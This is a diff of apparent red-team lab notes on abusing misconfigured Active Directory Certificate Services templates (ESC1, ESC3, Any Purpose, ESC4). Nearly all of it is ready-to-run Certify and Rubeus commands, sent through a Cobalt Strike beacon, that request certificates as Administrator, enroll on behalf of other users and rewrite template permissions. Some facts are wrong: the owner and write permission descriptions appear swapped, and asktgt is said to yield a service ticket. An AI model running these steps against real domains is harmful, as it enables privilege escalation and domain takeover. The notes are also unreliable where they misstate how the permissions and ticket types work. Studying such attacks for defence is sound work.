@@ -5,12 +5,12 @@ enumeration using certify
     beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-cas --quiet
     this will return information about CA and sub-CAs in the domain, along with their potential vulnerabilities
 
-ESC1 vulnerability:
+1. misconfigured 'client authentication' template:
     priv esc vuln that occurs when an attacker can enroll for a cert that has an EKU that enables client authentication
     and where subject info can be supplied by the requester
     enumeration for this vuln:
         beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
-            we're looking for the ENROLLEE_SUPPLIES_SUBJECT flag, client auth in the extended key usage
+            we're looking for the ENROLLEE_SUPPLIES_SUBJECT flag, client auth in the extended key usage (EKU)
             be sure to note the template name and publishing CAs here
     exploitation:
         beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC1 --upn Administrator --quiet
@@ -21,3 +21,38 @@ ESC1 vulnerability:
         this will produce a base64 encoded cert in PFX format, which can use with asktgt
             beacon> execute-assembly C:\Tools\Rubeus\Rubeus\bin\Release\Rubeus.exe asktgt /user:Administrator /domain:CONTOSO.COM /certificate:[cert] /enctype:aes256 /nowrap
         this will produce a service ticket!
+
+2. misconfigured 'certificate request agent' template:
+    priv esc vuln that occurs when an attacker can enroll for a cert that has the certificate request agent EKU enabled
+    these can be used to sign cert reqs on behalf of others, allowing for impersonation
+    enumeration:
+        beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
+            we're looking for 'Certificate Request Agent' EKU
+    exploitation:
+        request a cert from this template using current user
+            beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template ESC3 --quiet
+        then request a cert on behalf of another user
+            beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe request-agent --ca "lon-cs-1.contoso.com\CONTOSO Root CA" --template User --target Administrator --agent-pfx [cert] --quiet
+
+3. misconfigured 'any purpose' template:
+    priv esc vuln that occurs when an attacker can enroll for a cert that has the 'Any Purpose' or blank EKU 
+    we can use this for any purpose, so we can follow steps in #2 or #1 if we have ENROLEE_SUPPLIES_SUBJECT
+
+4. certificate template access control
+    priv esc vuln that occurs when there's an overly permissive ACE on a template allowing us to modify it
+    permissions of interest:
+        owner: implicit full control
+        fullcontrol: explicit full control
+        writeowner: generic write on the template 
+        writeproperty: can change the owner
+        writedacl: can change the access controls of the template
+    enumeration:
+        beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe enum-templates --filter-enabled --filter-vulnerable --hide-admins --quiet
+            looking for any permissions of interest
+    exploitation:
+        if we have write permissions...
+            grant yourself enrollment rights using --enroll [SID]
+            toggle manager approval using --manager-approval, and set signatures needed to 0 using --authorized-signature 0
+            toggle EKUs that allow client authentication, --client-auth, --pkinit-auth, or --smartcard-login
+            toggle the ENROLLEE_SUPPLIES_SUBJECT
+        beacon> execute-assembly C:\Tools\Certify\Certify\bin\Release\Certify.exe manage-template --template ESC4 --supply-subject --quiet
